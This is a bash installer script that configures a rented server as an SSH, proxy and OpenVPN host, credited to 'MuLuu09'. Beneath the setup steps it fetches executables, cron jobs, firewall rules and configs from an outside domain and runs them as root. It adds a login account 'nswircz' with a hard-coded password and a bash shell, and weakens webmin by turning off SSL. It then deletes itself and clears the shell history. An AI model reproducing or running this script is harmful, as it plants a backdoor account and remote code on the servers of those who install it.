#!/bin/bash
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
clear

echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear

apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS 

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
apt-get update;apt-get -y upgrade;apt-get -y install wget curl
echo "
INSTALLER PROCESS PLEASE WAIT

TAKE TIME 5-10 MINUTE
"

wget -O user-list http://rzserver.tk/source/user-list [ -f user-list ]; mv user-list /usr/local/bin/
	chmod +x /usr/local/bin/user-list

wget -O menu http://rzserver.tk/source/menu [ -f menu ]; mv menu /usr/local/bin/
	chmod +x /usr/local/bin/menu

wget -O monssh http://rzserver.tk/source/monssh [ -f monssh ]; mv monssh /usr/local/bin/
	chmod +x /usr/local/bin/monssh

apt-get -y install fail2ban;service fail2ban restart;
wget http://prdownloads.sourceforge.net/webadmin/webmin_1.820_all.deb
dpkg -i --force-all webmin_1.8*.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart

sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "http://rzserver.tk/source/banner"
service ssh restart;service sshd restart;

apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
service dropbear restart

apt-get -y install squid3
wget -O /etc/squid3/squid.conf "http://rzserver.tk/source/squid.conf"
sed -i "s/xxxxxxxxx/$myip/g" /etc/squid3/squid.conf
service squid3 restart

apt-get -y install nginx php5-fpm php5-cli
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "http://rzserver.tk/source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by MuLuu09 | telegram @MuLuu09 | whatsapp +601131731782</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "http://rzserver.tk/source/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

apt-get -y install openvpn
cd /etc/openvpn/
wget http://rzserver.tk/source/openvpn.tar
tar xf openvpn.tar
rm openvpn.tar
service openvpn restart
wget -O /etc/iptables.up.rules "http://rzserver.tk/source/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/xxxxxxxxx/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules

wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/MuluuJelekk/Muluu/master/client.ovpn"
sed -i "s/xxxxxxxxx/$myip/g" /home/vps/public_html/client.ovpn;
wget http://rzserver.tk/source/cronjob.tar;tar xf cronjob.tar
wget -O /home/vps/public_html/uptimes.php "http://rzserver.tk/source/uptimes.php"
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash nswircz
echo "nswircz:rzp" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
clear
cd
echo "#!/bin/bash

Keep Calm

For support:-
Email: muluujelekk@gmail.com
SMS/Telegram/Whatsapp: +601131731782

" > /etc/update-motd.d/99-setup-credits
chmod 755 /etc/update-motd.d/99-setup-credits
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript MuLuu09"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Script command : menu"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "LOG INSTALL  --> /root/log-install.txt"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"  | tee -a log-install.txt
echo "========================================"  | tee -a log-install.txt
rm $0;rm *.deb;rm *.sh;rm *.tar;cat /dev/null > ~/.bash_history && history -c